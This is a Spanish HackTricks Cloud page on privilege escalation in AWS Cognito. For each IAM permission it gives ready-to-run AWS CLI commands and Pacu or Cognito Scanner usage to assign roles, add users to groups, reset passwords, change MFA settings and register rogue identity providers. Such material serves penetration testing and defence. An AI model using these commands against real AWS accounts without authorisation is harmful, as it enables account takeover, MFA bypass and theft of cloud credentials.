# AWS - Cognito Privesc

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Cognito

Para más información sobre Cognito consulta:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Herramientas

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), el marco de explotación de AWS, ahora incluye los módulos "cognito\_\_enum" y "cognito\_\_attack" que automatizan la enumeración de todos los activos de Cognito en una cuenta y señalan configuraciones débiles, atributos de usuario utilizados para el control de acceso, etc., y también automatizan la creación de usuarios (incluyendo soporte para MFA) y la escalada de privilegios basada en atributos personalizados modificables, credenciales de pool de identidades utilizables, roles asumibles en tokens de identidad, etc.

Para una descripción de las funciones de los módulos, consulta la parte 2 del [artículo del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para instrucciones de instalación, visita la página principal de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Uso

Ejemplo de uso de cognito\_\_attack para intentar la creación de usuario y todos los vectores de privesc contra un pool de identidades y cliente de pool de usuarios dado:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Uso de ejemplo de cognito\_\_enum para recopilar todos los grupos de usuarios, clientes de grupos de usuarios, grupos de identidad, usuarios, etc. visibles en la cuenta actual de AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) es una herramienta CLI en python que implementa diferentes ataques en Cognito incluyendo una escalada de privesc.

#### Instalación
```bash
$ pip install cognito-scanner
```
#### Uso
```bash
$ cognito-scanner --help
```
### Recopilación de credenciales desde el Identity Pool

Como Cognito puede otorgar **credenciales de rol IAM** tanto a **usuarios autenticados** como **no autenticados**, si localizas el **ID del Identity Pool** de una aplicación (debería estar codificado en ella) puedes obtener nuevas credenciales y, por lo tanto, escalar privilegios (dentro de una cuenta de AWS donde probablemente ni siquiera tenías ninguna credencial previamente).

Para más información [**consulta esta página**](../aws-unauthenticated-enum-access/#cognito).

**Impacto Potencial:** Escalada de privilegios directa al rol de servicios asociado a usuarios no autenticados (y probablemente al asociado a usuarios autenticados).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Con este permiso puedes **otorgar cualquier rol de cognito** a los usuarios autenticados/no autenticados de la aplicación cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Si la aplicación cognito **no tiene habilitados usuarios no autenticados**, también podría necesitar el permiso `cognito-identity:UpdateIdentityPool` para habilitarlo.

**Impacto Potencial:** Escalada de privilegios directa a cualquier rol de cognito.

### `cognito-identity:update-identity-pool`

Un atacante con este permiso podría configurar, por ejemplo, un Cognito User Pool bajo su control o cualquier otro proveedor de identidad donde pueda iniciar sesión como **una forma de acceder a este Cognito Identity Pool**. Entonces, simplemente **iniciar sesión** en ese proveedor de usuarios le **permitirá acceder al rol autenticado configurado en el Identity Pool**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
También es posible **abusar de este permiso para permitir la autenticación básica**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Impacto Potencial**: Comprometer el rol IAM autenticado configurado dentro del pool de identidades.

### `cognito-idp:AdminAddUserToGroup`

Este permiso permite **agregar un usuario de Cognito a un grupo de Cognito**, por lo tanto, un atacante podría abusar de este permiso para agregar un usuario bajo su control a otros grupos con privilegios **mejores** o **diferentes roles IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Impacto Potencial:** Escalada de privilegios a otros grupos de Cognito e IAM roles asociados a Grupos de User Pool.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Un atacante con estos permisos podría **crear/actualizar grupos** con **cada IAM role que pueda ser utilizado por un Proveedor de Identidad de Cognito comprometido** y hacer que un usuario comprometido sea parte del grupo, accediendo a todos esos roles:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Impacto Potencial:** Privesc a otros roles IAM de Cognito.

### `cognito-idp:AdminConfirmSignUp`

Este permiso permite **verificar un registro**. Por defecto, cualquiera puede registrarse en aplicaciones Cognito, si eso se permite, un usuario podría crear una cuenta con cualquier dato y verificarla con este permiso.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Privesc indirecto al rol IAM del pool de identidades para usuarios autenticados si puedes registrar un nuevo usuario. Privesc indirecto a otras funcionalidades de la aplicación al poder confirmar cualquier cuenta.

### `cognito-idp:AdminCreateUser`

Este permiso permitiría a un atacante crear un nuevo usuario dentro del pool de usuarios. El nuevo usuario se crea habilitado, pero necesitará cambiar su contraseña.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Impacto Potencial:** Privesc directo al rol IAM del pool de identidades para usuarios autenticados. Privesc indirecto a otras funcionalidades de la aplicación al poder crear cualquier usuario.

### `cognito-idp:AdminEnableUser`

Este permiso puede ayudar en un escenario muy específico donde un atacante encuentra las credenciales de un usuario deshabilitado y necesita **habilitarlo de nuevo**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Escalada de privilegios indirecta al rol IAM del identity pool para usuarios autenticados y permisos del usuario si el atacante tenía credenciales para un usuario deshabilitado.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Este permiso permite iniciar sesión con el [**método ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Para más información, sigue el enlace.

### `cognito-idp:AdminSetUserPassword`

Este permiso permitiría a un atacante **cambiar la contraseña de cualquier usuario**, permitiéndole suplantar la identidad de cualquier usuario (que no tenga MFA activado).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Impacto Potencial:** Privesc directo a potencialmente cualquier usuario, por lo tanto, acceso a todos los grupos de los que cada usuario es miembro y acceso al rol IAM autenticado del Identity Pool.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Un atacante podría abusar potencialmente de este permiso para configurar un teléfono móvil bajo su control como **SMS MFA de un usuario**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Similar a la anterior, este permiso puede utilizarse para establecer las preferencias de MFA de un usuario y así eludir la protección MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Similar a la anterior, este permiso puede utilizarse para establecer las preferencias de MFA de un grupo de usuarios y así eludir la protección MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** También es posible actualizar el grupo de usuarios para cambiar la política de MFA. [Consulta la CLI aquí](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Impacto Potencial:** Escalada de privilegios indirecta a potencialmente cualquier usuario cuyas credenciales conozca el atacante, lo que podría permitir eludir la protección MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Un atacante con este permiso podría cambiar el correo electrónico, número de teléfono u otro atributo de un usuario bajo su control para intentar obtener más privilegios en una aplicación subyacente.\
Esto permite cambiar un correo electrónico o número de teléfono y marcarlo como verificado.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Impacto Potencial:** Posible escalada de privilegios indirecta en la aplicación subyacente que utiliza Cognito User Pool y que otorga privilegios basados en atributos de usuario.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Un atacante con este permiso podría **crear un nuevo Cliente de User Pool menos restringido** que los clientes de pool ya existentes. Por ejemplo, el nuevo cliente podría permitir cualquier tipo de método para autenticarse, no tener ningún secreto, tener la revocación de tokens deshabilitada, permitir que los tokens sean válidos por un período más largo...

Lo mismo se puede hacer si en lugar de crear un nuevo cliente, se **modifica uno existente**.

En la [**línea de comandos**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (o la [**actualización**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) puedes ver todas las opciones, ¡revísalas!
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Impacto Potencial:** Posible privesc indirecto al usuario autorizado del Identity Pool utilizado por el User Pool al crear un nuevo cliente que relaja las medidas de seguridad y permite a un atacante iniciar sesión con un usuario que pudo crear.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Un atacante podría abusar de este permiso para crear usuarios subiendo un csv con nuevos usuarios.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Impacto Potencial:** Privesc directo al rol IAM del pool de identidades para usuarios autenticados. Privesc indirecto a otras funcionalidades de la aplicación al poder crear cualquier usuario.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Un atacante podría crear un nuevo proveedor de identidad para luego poder **iniciar sesión a través de este proveedor**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Impacto Potencial:** Privesc directo al rol IAM del identity pool para usuarios autenticados. Privesc indirecto a otras funcionalidades de la aplicación al poder crear cualquier usuario.

### Análisis de cognito-sync:\*

Este es un permiso muy común por defecto en los roles de Cognito Identity Pools. Aunque un comodín en los permisos siempre parece malo (especialmente viniendo de AWS), **los permisos otorgados no son super útiles desde la perspectiva de un atacante**.

Este permiso permite leer la información de uso de Identity Pools y los Identity IDs dentro de los Identity Pools (que no es información sensible).\
Los Identity IDs pueden tener asignados [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html), que son información de las sesiones (AWS lo define como un **juego guardado**). Podría ser posible que esto contenga algún tipo de información sensible (pero la probabilidad es bastante baja). Puedes encontrar en la [**página de enumeración**](../aws-services/aws-cognito-enum/) cómo acceder a esta información.

Un atacante también podría usar estos permisos para **inscribirse en un stream de Cognito que publique cambios** en estos datasets o en un **lambda que se active por eventos de cognito**. No he visto que esto se use, y no esperaría información sensible aquí, pero no es imposible.

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
